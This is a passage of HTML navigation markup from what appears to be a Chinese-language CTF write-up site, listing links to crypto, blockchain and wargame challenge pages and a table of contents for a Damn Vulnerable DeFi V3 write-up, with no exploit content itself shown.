  
  
    <li class="md-nav__item">
      <a href="../../crypto/he_thrusts_his_fists_against_the_post/" class="md-nav__link">
        He Thrusts His Fists Against the Post
      </a>
    </li>
  

            
          
            
              
  
  
  
    
    <li class="md-nav__item md-nav__item--nested">
      
      
        <input class="md-nav__toggle md-toggle" data-md-toggle="__nav_6_13" type="checkbox" id="__nav_6_13" >
      
      
      
      
        <label class="md-nav__link" for="__nav_6_13">
          PBCTF 2021
          <span class="md-nav__icon md-icon"></span>
        </label>
      
      <nav class="md-nav" aria-label="PBCTF 2021" data-md-level="2">
        <label class="md-nav__title" for="__nav_6_13">
          <span class="md-nav__icon md-icon"></span>
          PBCTF 2021
        </label>
        <ul class="md-nav__list" data-md-scrollfix>
          
            
              
  
  
  
    <li class="md-nav__item">
      <a href="../../crypto/alkaloid_stream/" class="md-nav__link">
        Alkaloid Stream
      </a>
    </li>
  

            
          
            
              
  
  
  
    <li class="md-nav__item">
      <a href="../../crypto/steroid_stream/" class="md-nav__link">
        Steroid Stream
      </a>
    </li>
  

            
          
        </ul>
      </nav>
    </li>
  

            
          
            
              
  
  
  
    <li class="md-nav__item">
      <a href="../../crypto/easyxor/" class="md-nav__link">
        easyxor
      </a>
    </li>
  

            
          
            
              
  
  
  
    <li class="md-nav__item">
      <a href="../../crypto/ustc_easy_rsa/" class="md-nav__link">
        HackerGame - Easy RSA
      </a>
    </li>
  

            
          
            
              
  
  
  
    <li class="md-nav__item">
      <a href="../../crypto/baby_mac/" class="md-nav__link">
        Baby MAC
      </a>
    </li>
  

            
          
            
              
  
  
  
    <li class="md-nav__item">
      <a href="../../crypto/noteasy03/" class="md-nav__link">
        noteasy03
      </a>
    </li>
  

            
          
            
              
  
  
  
    <li class="md-nav__item">
      <a href="../../crypto/dealymaffs/" class="md-nav__link">
        Dealymaffs
      </a>
    </li>
  

            
          
            
              
  
  
  
    <li class="md-nav__item">
      <a href="../../crypto/weird_programmer/" class="md-nav__link">
        Weird Programmer
      </a>
    </li>
  

            
          
            
              
  
  
  
    <li class="md-nav__item">
      <a href="../../crypto/x_factor/" class="md-nav__link">
        X Factor
      </a>
    </li>
  

            
          
            
              
  
  
  
    <li class="md-nav__item">
      <a href="../../crypto/paiaiai/" class="md-nav__link">
        P(ai)^3
      </a>
    </li>
  

            
          
            
              
  
  
  
    <li class="md-nav__item">
      <a href="../../crypto/casino/" class="md-nav__link">
        Casino
      </a>
    </li>
  

            
          
            
              
  
  
  
    <li class="md-nav__item">
      <a href="../../crypto/black_hole/" class="md-nav__link">
        Black Hole
      </a>
    </li>
  

            
          
            
              
  
  
  
    <li class="md-nav__item">
      <a href="../../crypto/diophantine/" class="md-nav__link">
        Diophantine
      </a>
    </li>
  

            
          
            
              
  
  
  
    
    <li class="md-nav__item md-nav__item--nested">
      
      
        <input class="md-nav__toggle md-toggle" data-md-toggle="__nav_6_25" type="checkbox" id="__nav_6_25" >
      
      
      
      
        <label class="md-nav__link" for="__nav_6_25">
          Google CTF 2022
          <span class="md-nav__icon md-icon"></span>
        </label>
      
      <nav class="md-nav" aria-label="Google CTF 2022" data-md-level="2">
        <label class="md-nav__title" for="__nav_6_25">
          <span class="md-nav__icon md-icon"></span>
          Google CTF 2022
        </label>
        <ul class="md-nav__list" data-md-scrollfix>
          
            
              
  
  
  
    <li class="md-nav__item">
      <a href="../../crypto/cycling/" class="md-nav__link">
        Cycling
      </a>
    </li>
  

            
          
            
              
  
  
  
    <li class="md-nav__item">
      <a href="../../crypto/maybe_someday/" class="md-nav__link">
        Maybe Someday
      </a>
    </li>
  

            
          
        </ul>
      </nav>
    </li>
  

            
          
            
              
  
  
  
    <li class="md-nav__item">
      <a href="../../crypto/dynamic_rsa/" class="md-nav__link">
        Dynamic RSA
      </a>
    </li>
  

            
          
            
              
  
  
  
    
    <li class="md-nav__item md-nav__item--nested">
      
      
        <input class="md-nav__toggle md-toggle" data-md-toggle="__nav_6_27" type="checkbox" id="__nav_6_27" >
      
      
      
      
        <label class="md-nav__link" for="__nav_6_27">
          corCTF 2022
          <span class="md-nav__icon md-icon"></span>
        </label>
      
      <nav class="md-nav" aria-label="corCTF 2022" data-md-level="2">
        <label class="md-nav__title" for="__nav_6_27">
          <span class="md-nav__icon md-icon"></span>
          corCTF 2022
        </label>
        <ul class="md-nav__list" data-md-scrollfix>
          
            
              
  
  
  
    <li class="md-nav__item">
      <a href="../../crypto/exchanged/" class="md-nav__link">
        exchanged
      </a>
    </li>
  

            
          
            
              
  
  
  
    <li class="md-nav__item">
      <a href="../../crypto/leapfrog/" class="md-nav__link">
        leapfrog
      </a>
    </li>
  

            
          
        </ul>
      </nav>
    </li>
  

            
          
            
              
  
  
  
    <li class="md-nav__item">
      <a href="../../crypto/shuffle128/" class="md-nav__link">
        shuffle128
      </a>
    </li>
  

            
          
            
              
  
  
  
    <li class="md-nav__item">
      <a href="../../crypto/badkey1/" class="md-nav__link">
        badkey1
      </a>
    </li>
  

            
          
        </ul>
      </nav>
    </li>
  

    
      
      
      

  
  
  
    
    <li class="md-nav__item md-nav__item--nested">
      
      
        <input class="md-nav__toggle md-toggle" data-md-toggle="__nav_7" type="checkbox" id="__nav_7" >
      
      
      
      
        <label class="md-nav__link" for="__nav_7">
          Blockchain
          <span class="md-nav__icon md-icon"></span>
        </label>
      
      <nav class="md-nav" aria-label="Blockchain" data-md-level="1">
        <label class="md-nav__title" for="__nav_7">
          <span class="md-nav__icon md-icon"></span>
          Blockchain
        </label>
        <ul class="md-nav__list" data-md-scrollfix>
          
            
              
  
  
  
    <li class="md-nav__item">
      <a href="../../blockchain/code_is_law/" class="md-nav__link">
        Code is Law
      </a>
    </li>
  

            
          
            
              
  
  
  
    <li class="md-nav__item">
      <a href="../../blockchain/totally_secure_dapp/" class="md-nav__link">
        Totally Secure Dapp
      </a>
    </li>
  

            
          
            
              
  
  
  
    <li class="md-nav__item">
      <a href="../../blockchain/cairo_reverse/" class="md-nav__link">
        Cairo Reverse
      </a>
    </li>
  

            
          
            
              
  
  
  
    <li class="md-nav__item">
      <a href="../../blockchain/tctf_nft_market/" class="md-nav__link">
        TCTF NFT Market
      </a>
    </li>
  

            
          
            
              
  
  
  
    
    <li class="md-nav__item md-nav__item--nested">
      
      
        <input class="md-nav__toggle md-toggle" data-md-toggle="__nav_7_5" type="checkbox" id="__nav_7_5" >
      
      
      
      
        <label class="md-nav__link" for="__nav_7_5">
          DownUnderCTF 2022
          <span class="md-nav__icon md-icon"></span>
        </label>
      
      <nav class="md-nav" aria-label="DownUnderCTF 2022" data-md-level="2">
        <label class="md-nav__title" for="__nav_7_5">
          <span class="md-nav__icon md-icon"></span>
          DownUnderCTF 2022
        </label>
        <ul class="md-nav__list" data-md-scrollfix>
          
            
              
  
  
  
    <li class="md-nav__item">
      <a href="../../blockchain/secret_and_ephemeral/" class="md-nav__link">
        Secret and Ephemeral
      </a>
    </li>
  

            
          
            
              
  
  
  
    <li class="md-nav__item">
      <a href="../../blockchain/private_log/" class="md-nav__link">
        Private Log
      </a>
    </li>
  

            
          
        </ul>
      </nav>
    </li>
  

            
          
            
              
  
  
  
    <li class="md-nav__item">
      <a href="../../blockchain/memory_master_on_the_chain/" class="md-nav__link">
        Èìæ‰∏äËÆ∞ÂøÜÂ§ßÂ∏à
      </a>
    </li>
  

            
          
            
              
  
  
  
    <li class="md-nav__item">
      <a href="../../blockchain/cookie_market/" class="md-nav__link">
        Cookie Market
      </a>
    </li>
  

            
          
            
              
  
  
  
    <li class="md-nav__item">
      <a href="../../blockchain/tetctftoken/" class="md-nav__link">
        TetCTFToken
      </a>
    </li>
  

            
          
            
              
  
  
  
    <li class="md-nav__item">
      <a href="../../blockchain/realwrap/" class="md-nav__link">
        realwrap
      </a>
    </li>
  

            
          
            
              
  
  
  
    <li class="md-nav__item">
      <a href="../../blockchain/evmvm/" class="md-nav__link">
        evmvm
      </a>
    </li>
  

            
          
            
              
  
  
  
    
    <li class="md-nav__item md-nav__item--nested">
      
      
        <input class="md-nav__toggle md-toggle" data-md-toggle="__nav_7_11" type="checkbox" id="__nav_7_11" >
      
      
      
      
        <label class="md-nav__link" for="__nav_7_11">
          HackTM CTF 2023
          <span class="md-nav__icon md-icon"></span>
        </label>
      
      <nav class="md-nav" aria-label="HackTM CTF 2023" data-md-level="2">
        <label class="md-nav__title" for="__nav_7_11">
          <span class="md-nav__icon md-icon"></span>
          HackTM CTF 2023
        </label>
        <ul class="md-nav__list" data-md-scrollfix>
          
            
              
  
  
  
    <li class="md-nav__item">
      <a href="../../blockchain/dragon_slayer/" class="md-nav__link">
        Dragon Slayer
      </a>
    </li>
  

            
          
            
              
  
  
  
    <li class="md-nav__item">
      <a href="../../blockchain/diamond_heist/" class="md-nav__link">
        Diamond Heist
      </a>
    </li>
  

            
          
        </ul>
      </nav>
    </li>
  

            
          
            
              
  
  
  
    <li class="md-nav__item">
      <a href="../../blockchain/tealyman/" class="md-nav__link">
        TealyMan
      </a>
    </li>
  

            
          
            
              
  
  
  
    <li class="md-nav__item">
      <a href="../../blockchain/sailors_revenge/" class="md-nav__link">
        Sailor's Revenge
      </a>
    </li>
  

            
          
            
              
  
  
  
    
    <li class="md-nav__item md-nav__item--nested">
      
      
        <input class="md-nav__toggle md-toggle" data-md-toggle="__nav_7_14" type="checkbox" id="__nav_7_14" >
      
      
      
      
        <label class="md-nav__link" for="__nav_7_14">
          SEETF 2023
          <span class="md-nav__icon md-icon"></span>
        </label>
      
      <nav class="md-nav" aria-label="SEETF 2023" data-md-level="2">
        <label class="md-nav__title" for="__nav_7_14">
          <span class="md-nav__icon md-icon"></span>
          SEETF 2023
        </label>
        <ul class="md-nav__list" data-md-scrollfix>
          
            
              
  
  
  
    <li class="md-nav__item">
      <a href="../../blockchain/murky_seepass/" class="md-nav__link">
        üéì Murky SEEPass
      </a>
    </li>
  

            
          
            
              
  
  
  
    <li class="md-nav__item">
      <a href="../../blockchain/operation_feathered_fortune_fiasco/" class="md-nav__link">
        Operation Feathered Fortune Fiasco
      </a>
    </li>
  

            
          
            
              
  
  
  
    <li class="md-nav__item">
      <a href="../../blockchain/pigeon_bank/" class="md-nav__link">
        Pigeon Bank
      </a>
    </li>
  

            
          
            
              
  
  
  
    <li class="md-nav__item">
      <a href="../../blockchain/pigeon_vault/" class="md-nav__link">
        Pigeon Vault
      </a>
    </li>
  

            
          
        </ul>
      </nav>
    </li>
  

            
          
            
              
  
  
  
    
    <li class="md-nav__item md-nav__item--nested">
      
      
        <input class="md-nav__toggle md-toggle" data-md-toggle="__nav_7_15" type="checkbox" id="__nav_7_15" >
      
      
      
      
        <label class="md-nav__link" for="__nav_7_15">
          CrewCTF 2023
          <span class="md-nav__icon md-icon"></span>
        </label>
      
      <nav class="md-nav" aria-label="CrewCTF 2023" data-md-level="2">
        <label class="md-nav__title" for="__nav_7_15">
          <span class="md-nav__icon md-icon"></span>
          CrewCTF 2023
        </label>
        <ul class="md-nav__list" data-md-scrollfix>
          
            
              
  
  
  
    <li class="md-nav__item">
      <a href="../../blockchain/positive/" class="md-nav__link">
        positive
      </a>
    </li>
  

            
          
            
              
  
  
  
    <li class="md-nav__item">
      <a href="../../blockchain/infinite/" class="md-nav__link">
        infinite
      </a>
    </li>
  

            
          
            
              
  
  
  
    <li class="md-nav__item">
      <a href="../../blockchain/deception/" class="md-nav__link">
        deception
      </a>
    </li>
  

            
          
        </ul>
      </nav>
    </li>
  

            
          
            
              
  
  
  
    <li class="md-nav__item">
      <a href="../../blockchain/tribunal/" class="md-nav__link">
        tribunal
      </a>
    </li>
  

            
          
            
              
  
  
  
    <li class="md-nav__item">
      <a href="../../blockchain/tokyo_payload/" class="md-nav__link">
        Tokyo Payload
      </a>
    </li>
  

            
          
            
              
  
  
  
    
    <li class="md-nav__item md-nav__item--nested">
      
      
        <input class="md-nav__toggle md-toggle" data-md-toggle="__nav_7_18" type="checkbox" id="__nav_7_18" >
      
      
      
      
        <label class="md-nav__link" for="__nav_7_18">
          Paradigm CTF 2023
          <span class="md-nav__icon md-icon"></span>
        </label>
      
      <nav class="md-nav" aria-label="Paradigm CTF 2023" data-md-level="2">
        <label class="md-nav__title" for="__nav_7_18">
          <span class="md-nav__icon md-icon"></span>
          Paradigm CTF 2023
        </label>
        <ul class="md-nav__list" data-md-scrollfix>
          
            
              
  
  
  
    <li class="md-nav__item">
      <a href="../../blockchain/paradigm/one_hundred_percent/" class="md-nav__link">
        100%
      </a>
    </li>
  

            
          
        </ul>
      </nav>
    </li>
  

            
          
        </ul>
      </nav>
    </li>
  

    
      
      
      

  
  
    
  
  
    
    <li class="md-nav__item md-nav__item--active md-nav__item--nested">
      
      
        <input class="md-nav__toggle md-toggle" data-md-toggle="__nav_8" type="checkbox" id="__nav_8" checked>
      
      
      
      
        <label class="md-nav__link" for="__nav_8">
          Wargames
          <span class="md-nav__icon md-icon"></span>
        </label>
      
      <nav class="md-nav" aria-label="Wargames" data-md-level="1">
        <label class="md-nav__title" for="__nav_8">
          <span class="md-nav__icon md-icon"></span>
          Wargames
        </label>
        <ul class="md-nav__list" data-md-scrollfix>
          
            
              
  
  
  
    
    <li class="md-nav__item md-nav__item--nested">
      
      
        <input class="md-nav__toggle md-toggle" data-md-toggle="__nav_8_1" type="checkbox" id="__nav_8_1" >
      
      
      
      
        <label class="md-nav__link" for="__nav_8_1">
          OverTheWire
          <span class="md-nav__icon md-icon"></span>
        </label>
      
      <nav class="md-nav" aria-label="OverTheWire" data-md-level="2">
        <label class="md-nav__title" for="__nav_8_1">
          <span class="md-nav__icon md-icon"></span>
          OverTheWire
        </label>
        <ul class="md-nav__list" data-md-scrollfix>
          
            
              
  
  
  
    <li class="md-nav__item">
      <a href="../natas/" class="md-nav__link">
        Natas
      </a>
    </li>
  

            
          
            
              
  
  
  
    <li class="md-nav__item">
      <a href="../leviathan/" class="md-nav__link">
        Leviathan
      </a>
    </li>
  

            
          
            
              
  
  
  
    <li class="md-nav__item">
      <a href="../krypton/" class="md-nav__link">
        Krypton
      </a>
    </li>
  

            
          
            
              
  
  
  
    <li class="md-nav__item">
      <a href="../narnia/" class="md-nav__link">
        Narnia
      </a>
    </li>
  

            
          
        </ul>
      </nav>
    </li>
  

            
          
            
              
  
  
  
    
    <li class="md-nav__item md-nav__item--nested">
      
      
        <input class="md-nav__toggle md-toggle" data-md-toggle="__nav_8_2" type="checkbox" id="__nav_8_2" >
      
      
      
      
        <label class="md-nav__link" for="__nav_8_2">
          Protostar
          <span class="md-nav__icon md-icon"></span>
        </label>
      
      <nav class="md-nav" aria-label="Protostar" data-md-level="2">
        <label class="md-nav__title" for="__nav_8_2">
          <span class="md-nav__icon md-icon"></span>
          Protostar
        </label>
        <ul class="md-nav__list" data-md-scrollfix>
          
            
              
  
  
  
    <li class="md-nav__item">
      <a href="../protostar/stack/" class="md-nav__link">
        Stack
      </a>
    </li>
  

            
          
            
              
  
  
  
    <li class="md-nav__item">
      <a href="../protostar/format/" class="md-nav__link">
        Format
      </a>
    </li>
  

            
          
            
              
  
  
  
    <li class="md-nav__item">
      <a href="../protostar/heap/" class="md-nav__link">
        Heap
      </a>
    </li>
  

            
          
            
              
  
  
  
    <li class="md-nav__item">
      <a href="../protostar/net/" class="md-nav__link">
        Net
      </a>
    </li>
  

            
          
            
              
  
  
  
    <li class="md-nav__item">
      <a href="../protostar/final/" class="md-nav__link">
        Final
      </a>
    </li>
  

            
          
        </ul>
      </nav>
    </li>
  

            
          
            
              
  
  
    
  
  
    
    <li class="md-nav__item md-nav__item--active md-nav__item--nested">
      
      
        <input class="md-nav__toggle md-toggle" data-md-toggle="__nav_8_3" type="checkbox" id="__nav_8_3" checked>
      
      
      
      
        <label class="md-nav__link" for="__nav_8_3">
          Ethereum
          <span class="md-nav__icon md-icon"></span>
        </label>
      
      <nav class="md-nav" aria-label="Ethereum" data-md-level="2">
        <label class="md-nav__title" for="__nav_8_3">
          <span class="md-nav__icon md-icon"></span>
          Ethereum
        </label>
        <ul class="md-nav__list" data-md-scrollfix>
          
            
              
  
  
  
    <li class="md-nav__item">
      <a href="../ethernaut/" class="md-nav__link">
        Ethernaut
      </a>
    </li>
  

            
          
            
              
  
  
    
  
  
    <li class="md-nav__item md-nav__item--active">
      
      <input class="md-nav__toggle md-toggle" data-md-toggle="toc" type="checkbox" id="__toc">
      
      
      
        <label class="md-nav__link md-nav__link--active" for="__toc">
          Damn Vulnerable DeFi V3
          <span class="md-nav__icon md-icon"></span>
        </label>
      
      <a href="./" class="md-nav__link md-nav__link--active">
        Damn Vulnerable DeFi V3
      </a>
      
        

<nav class="md-nav md-nav--secondary" aria-label="ÁõÆÂΩï">
  
  
  
  
    <label class="md-nav__title" for="__toc">
      <span class="md-nav__icon md-icon"></span>
      ÁõÆÂΩï
    </label>
    <ul class="md-nav__list" data-md-component="toc" data-md-scrollfix>
      
        <li class="md-nav__item">
  <a href="#how-to-play" class="md-nav__link">
    How to Play
  </a>
  
    <nav class="md-nav" aria-label="How to Play">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#hardhat" class="md-nav__link">
    Hardhat
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#foundry" class="md-nav__link">
    Foundry
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
      
        <li class="md-nav__item">
  <a href="#1-unstoppable" class="md-nav__link">
    1. Unstoppable
  </a>
  
    <nav class="md-nav" aria-label="1. Unstoppable">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#using-echidna" class="md-nav__link">
    Using Echidna
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#_1" class="md-nav__link">
    ÂèÇËÄÉËµÑÊñô
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
      
        <li class="md-nav__item">
  <a href="#2-naive-receiver" class="md-nav__link">
    2. Naive Receiver
  </a>
  
    <nav class="md-nav" aria-label="2. Naive Receiver">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#exploit" class="md-nav__link">
    Exploit
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#using-echidna_1" class="md-nav__link">
    Using Echidna
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#_2" class="md-nav__link">
    ÂèÇËÄÉËµÑÊñô
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
      
        <li class="md-nav__item">
  <a href="#3-truster" class="md-nav__link">
    3. Truster
  </a>
  
    <nav class="md-nav" aria-label="3. Truster">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#_3" class="md-nav__link">
    ÂèÇËÄÉËµÑÊñô
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
      
        <li class="md-nav__item">
  <a href="#4-side-entrance" class="md-nav__link">
    4. Side Entrance
  </a>
  
    <nav class="md-nav" aria-label="4. Side Entrance">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#exploit_1" class="md-nav__link">
    Exploit
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#using-echidna_2" class="md-nav__link">
    Using Echidna
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
      
        <li class="md-nav__item">
  <a href="#5-the-rewarder" class="md-nav__link">
    5. The Rewarder
  </a>
  
    <nav class="md-nav" aria-label="5. The Rewarder">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#exploit_2" class="md-nav__link">
    Exploit
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#using-echidna_3" class="md-nav__link">
    Using Echidna
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#_4" class="md-nav__link">
    ÂèÇËÄÉËµÑÊñô
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
      
        <li class="md-nav__item">
  <a href="#6-selfie" class="md-nav__link">
    6. Selfie
  </a>
  
    <nav class="md-nav" aria-label="6. Selfie">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#exploit_3" class="md-nav__link">
    Exploit
  </a>
  
    <nav class="md-nav" aria-label="Exploit">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#hardhat_1" class="md-nav__link">
    Hardhat
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#foundry_1" class="md-nav__link">
    Foundry
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
        
      </ul>
    </nav>
  
</li>
      
        <li class="md-nav__item">
  <a href="#7-compromised" class="md-nav__link">
    7. Compromised
  </a>
  
    <nav class="md-nav" aria-label="7. Compromised">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#exploit_4" class="md-nav__link">
    Exploit
  </a>
  
    <nav class="md-nav" aria-label="Exploit">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#hardhat_2" class="md-nav__link">
    Hardhat
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#foundry_2" class="md-nav__link">
    Foundry
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
        
      </ul>
    </nav>
  
</li>
      
        <li class="md-nav__item">
  <a href="#8-puppet" class="md-nav__link">
    8. Puppet
  </a>
  
    <nav class="md-nav" aria-label="8. Puppet">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#exploit_5" class="md-nav__link">
    Exploit
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#references" class="md-nav__link">
    References
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
      
    </ul>
  
</nav>
      
    </li>
  

            
          
            
              
  
  
  
    
    <li class="md-nav__item md-nav__item--nested">
      
      
        <input class="md-nav__toggle md-toggle" data-md-toggle="__nav_8_3_3" type="checkbox" id="__nav_8_3_3" >
      
      
      
      
        <label class="md-nav__link" for="__nav_8_3_3">
          QuillCTF
          <span class="md-nav__icon md-icon"></span>
        </label>
      
      <nav class="md-nav" aria-label="QuillCTF" data-md-level="3">
        <label class="md-nav__title" for="__nav_8_3_3">
          <span class="md-nav__icon md-icon"></span>
          QuillCTF
        </label>
        <ul class="md-nav__list" data-md-scrollfix>
          
            
              
  
  
  
    <li class="md-nav__item">
      <a href="../quillctf/slot_puzzle/" class="md-nav__link">
        Slot Puzzle
      </a>
    </li>
  

            
          
            
              
  
  
  
    <li class="md-nav__item">
      <a href="../quillctf/invest_pool/" class="md-nav__link">
        Invest Pool
      </a>
    </li>
  

            
          
            
              
  
  
  
    <li class="md-nav__item">
      <a href="../quillctf/assert_equal/" class="md-nav__link">
        assertEqual
      </a>
    </li>
  

            
          
            
              
  
  
  
    <li class="md-nav__item">
      <a href="../quillctf/collect/" class="md-nav__link">
        Collect
      </a>
    </li>
  

            
          
            
              
  
  
  
    <li class="md-nav__item">
      <a href="../quillctf/nftbank/" class="md-nav__link">
        NFTBANK
      </a>
    </li>
  

            
          
            
              
  
  
  
    <li class="md-nav__item">
      <a href="../quillctf/license_manager/" class="md-nav__link">
        LicenseManager
      </a>
    </li>
  

            
          
        </ul>
      </nav>
    </li>
  

            
          
            
              
  
  
  
    <li class="md-nav__item">
      <a href="../defi_security_summit/" class="md-nav__link">
        A-MAZE-X CTF 2023
      </a>
    </li>
  

            
          
        </ul>
      </nav>
    </li>
  

            
          
            
              
  
  
  
    
    <li class="md-nav__item md-nav__item--nested">
      
      
        <input class="md-nav__toggle md-toggle" data-md-toggle="__nav_8_4" type="checkbox" id="__nav_8_4" >
      
      
      
      
        <label class="md-nav__link" for="__nav_8_4">
          Solana
          <span class="md-nav__icon md-icon"></span>
        </label>
      
      <nav class="md-nav" aria-label="Solana" data-md-level="2">
        <label class="md-nav__title" for="__nav_8_4">
          <span class="md-nav__icon md-icon"></span>
          Solana
        </label>
        <ul class="md-nav__list" data-md-scrollfix>
          
            
              
  
  
  
    <li class="md-nav__item">
      <a href="../solana_pathway/" class="md-nav__link">
        Solana Pathway
      </a>
    </li>
  

            
          
            
              
  
  
  
    <li class="md-nav__item">
      <a href="../solana_security_workshop/" class="md-nav__link">
        Solana Security Workshop
      </a>
    </li>
  

            
          
        </ul>
      </nav>
    </li>
  

            
          
        </ul>
      </nav>
    </li>
  

    
      
      
      

  
  
  
    
    <li class="md-nav__item md-nav__item--nested">
      
      
        <input class="md-nav__toggle md-toggle" data-md-toggle="__nav_9" type="checkbox" id="__nav_9" >
      
      
      
      
        <label class="md-nav__link" for="__nav_9">
          ÂΩ©Ëõã
          <span class="md-nav__icon md-icon"></span>
        </label>
      
      <nav class="md-nav" aria-label="ÂΩ©Ëõã" data-md-level="1">
        <label class="md-nav__title" for="__nav_9">
          <span class="md-nav__icon md-icon"></span>
          ÂΩ©Ëõã
        </label>
        <ul class="md-nav__list" data-md-scrollfix>
          
            
              
  
  
  
    <li class="md-nav__item">
      <a href="../../eggs/ctfhub_index/" class="md-nav__link">
        CTFHub - È¶ñÈ°µ
      </a>
    </li>
  

            
          
            
              
  
  
  
    <li class="md-nav__item">
      <a href="../../eggs/ctfhub_wechat/" class="md-nav__link">
        CTFHub - ÂÖ¨‰ºóÂè∑
      </a>
    </li>
  

            
          
            
              
  
  
  
    <li class="md-nav__item">
      <a href="../../eggs/ctfhub_tools/" class="md-nav__link">
        CTFHub - Â∑•ÂÖ∑
      </a>
    </li>
  

            
          
            
              
  
  
  
    <li class="md-nav__item">
      <a href="../../eggs/ctfhub_match/" class="md-nav__link">
        CTFHub - Ëµõ‰∫ã
      </a>
    </li>
  

            
          
            
              
  
  
  
    <li class="md-nav__item">
      <a href="../../eggs/ctfhub_exams/" class="md-nav__link">
        CTFHub - ÁúüÈ¢ò
      </a>
    </li>
  

            
          
        </ul>
      </nav>
    </li>
  

    
  </ul>
</nav>
                  </div>
                </div>
              </div>
            
            
              
              <div class="md-sidebar md-sidebar--secondary" data-md-component="sidebar" data-md-type="toc" >
                <div class="md-sidebar__scrollwrap">
                  <div class="md-sidebar__inner">
                    

<nav class="md-nav md-nav--secondary" aria-label="ÁõÆÂΩï">
  
  
  
  
    <label class="md-nav__title" for="__toc">
      <span class="md-nav__icon md-icon"></span>
      ÁõÆÂΩï
    </label>
    <ul class="md-nav__list" data-md-component="toc" data-md-scrollfix>
      
        <li class="md-nav__item">
  <a href="#how-to-play" class="md-nav__link">
    How to Play
  </a>
  
    <nav class="md-nav" aria-label="How to Play">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#hardhat" class="md-nav__link">
    Hardhat
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#foundry" class="md-nav__link">
    Foundry
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
      
        <li class="md-nav__item">
  <a href="#1-unstoppable" class="md-nav__link">
    1. Unstoppable
  </a>
  
    <nav class="md-nav" aria-label="1. Unstoppable">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#using-echidna" class="md-nav__link">
    Using Echidna
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#_1" class="md-nav__link">
    ÂèÇËÄÉËµÑÊñô
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
      
        <li class="md-nav__item">
  <a href="#2-naive-receiver" class="md-nav__link">
    2. Naive Receiver
  </a>
  
    <nav class="md-nav" aria-label="2. Naive Receiver">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#exploit" class="md-nav__link">
    Exploit
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#using-echidna_1" class="md-nav__link">
    Using Echidna
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#_2" class="md-nav__link">
    ÂèÇËÄÉËµÑÊñô
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
      
        <li class="md-nav__item">
  <a href="#3-truster" class="md-nav__link">
    3. Truster
  </a>
  
    <nav class="md-nav" aria-label="3. Truster">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#_3" class="md-nav__link">
    ÂèÇËÄÉËµÑÊñô
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
      
        <li class="md-nav__item">
  <a href="#4-side-entrance" class="md-nav__link">
    4. Side Entrance
  </a>
  
    <nav class="md-nav" aria-label="4. Side Entrance">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#exploit_1" class="md-nav__link">
    Exploit
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#using-echidna_2" class="md-nav__link">
    Using Echidna
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
      
        <li class="md-nav__item">
  <a href="#5-the-rewarder" class="md-nav__link">
    5. The Rewarder
  </a>
  
    <nav class="md-nav" aria-label="5. The Rewarder">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#exploit_2" class="md-nav__link">
    Exploit
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#using-echidna_3" class="md-nav__link">
    Using Echidna
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#_4" class="md-nav__link">
    ÂèÇËÄÉËµÑÊñô
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
      
        <li class="md-nav__item">
  <a href="#6-selfie" class="md-nav__link">
    6. Selfie
  </a>
  
    <nav class="md-nav" aria-label="6. Selfie">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#exploit_3" class="md-nav__link">
    Exploit
  </a>
  
    <nav class="md-nav" aria-label="Exploit">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#hardhat_1" class="md-nav__link">
    Hardhat
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#foundry_1" class="md-nav__link">
    Foundry
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
        
      </ul>
    </nav>
  
</li>
      
        <li class="md-nav__item">
  <a href="#7-compromised" class="md-nav__link">
    7. Compromised
  </a>
  
    <nav class="md-nav" aria-label="7. Compromised">
      <ul class="md-nav__list">
